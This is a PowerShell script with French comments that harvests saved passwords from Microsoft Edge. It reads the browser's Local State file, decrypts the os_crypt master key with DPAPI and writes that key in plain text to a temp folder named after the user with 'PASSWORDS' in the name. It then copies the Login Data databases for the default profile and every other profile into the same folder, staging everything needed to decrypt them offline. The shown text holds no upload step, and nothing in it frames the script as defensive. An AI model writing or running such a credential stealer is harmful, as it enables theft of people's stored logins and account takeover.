# Création du dossier temporaire
$FolderName = "$env:USERNAME-PASSWORDS-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$DestinationPath = "$env:TEMP/$FolderName"
New-Item -Path $DestinationPath -ItemType Directory
New-Item -Path "$DestinationPath\edge" -ItemType Directory

Add-Type -AssemblyName System.Security
$localStatePath_edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"

if (Test-Path $localStatePath_edge) {
    $localStateContent = Get-Content -Path $localStatePath_edge -Raw UTF8
    $jsonData = ConvertFrom-Json -InputObject $localStateContent
} else {
    Write-Output "Le fichier Local State n'existe pas à l'emplacement spécifié."
}

$encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
try {
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $decryptedKeyBase64 = [Convert]::ToBase64String($decryptedKey)
}
catch {
    Write-Output "Erreur lors du déchiffrement de la clé Edge : $_"
}


# Récupère les informations de connexion pour le profil par défaut
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Destination "$DestinationPath\edge\LoginData_0"
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination "$DestinationPath\edge\LocalState"
New-Item -Path "$DestinationPath\edge\decrypted_key_edge.txt" -ItemType File -Value $decryptedKeyBase64

# Récupère les informations de connexion pour chaque profil "Profile*"
$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
$index = 1
foreach ($profile in $profiles) {
    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
    if (Test-Path $loginDataPath) {
        Copy-Item $loginDataPath -Destination "$DestinationPath\edge\LoginData_$index"
        $index++
    }
}